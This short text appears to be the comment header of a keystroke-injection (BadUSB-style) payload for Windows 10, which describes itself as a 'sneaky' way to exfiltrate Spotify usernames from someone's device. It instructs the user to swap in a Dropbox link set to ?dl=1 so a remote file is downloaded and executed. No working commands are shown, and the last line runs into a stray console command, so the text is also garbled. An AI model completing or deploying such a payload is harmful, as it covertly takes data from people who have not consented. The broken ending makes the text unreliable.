REM     Description: This payload is meant to exfiltrate spotify usernames on the device. Some people are too afraid to ask for their spotify or playlist so here is a sneaky way to do so.

REM     Target: Windows 10

REM     Remember to replace the link with your DropBox shared link for the intended file to download
REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properlymode con:cols=14 lines=1
